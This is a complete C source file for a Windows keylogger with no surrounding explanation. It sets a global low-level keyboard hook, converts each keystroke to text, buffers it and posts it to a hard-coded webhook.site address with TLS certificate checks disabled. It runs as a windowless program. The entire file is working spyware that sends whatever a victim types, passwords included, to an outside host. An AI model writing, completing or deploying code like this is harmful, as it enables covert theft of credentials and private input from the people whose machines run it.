#include <windows.h>
#include <stdio.h>
#include <curl/curl.h>

#define BUFFER_SIZE 1024
#define MIN_SEND_THRESHOLD 10
#define WEBHOOK_URL "https://webhook.site/def6f930-c87d-4977-b83f-ae342fc681a2"

HHOOK hKeyboardHook;
char keystrokeBuffer[BUFFER_SIZE] = {0};

// Function to send data to the webhook
void SendToWebhook(const char *data) {
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize CURL\n");
        return;
    }

    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);  // Disable SSL verification
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);  // Disable host verification
    curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
}

// Stores characters to a buffer and sends when a certain threshold is reached
void StoreToBuffer(const char *data) {
    strncat(keystrokeBuffer, data, BUFFER_SIZE - strlen(keystrokeBuffer) - 1);
    if (strlen(keystrokeBuffer) > MIN_SEND_THRESHOLD) {
        SendToWebhook(keystrokeBuffer);
        memset(keystrokeBuffer, 0, sizeof(keystrokeBuffer));
    }
}

// Hook procedure to capture keyboard input
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        char key[5] = {0};
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        wchar_t buf[16];
        if (ToUnicode(kbdStruct->vkCode, MapVirtualKey(kbdStruct->vkCode, MAPVK_VK_TO_VSC),
											keyboardState,
											buf,
											sizeof(buf)/sizeof(buf[0]), 0) == 1) {
            wcstombs(key, buf, sizeof(key));
            StoreToBuffer(key);
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Main application entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}
